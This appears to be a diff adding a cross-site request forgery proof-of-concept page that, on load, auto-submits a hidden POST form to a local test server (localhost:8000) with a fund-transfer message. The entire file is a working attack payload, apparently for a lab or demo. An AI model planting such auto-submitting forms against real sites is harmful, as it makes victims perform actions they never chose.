@@ -1,0 +1,10 @@
+<html>
+  <head>
+    <title>CSRF Form</title>
+  </head>
+  <body onload="document.message_form.submit()">
+    <form action="http://localhost:8000/message/" method="POST" name="message_form" style="display: none;">
+      <input type="text" name="message" value="Please transfer 1000 from my account to charity." />
+    </form>
+  </body>
+</html>
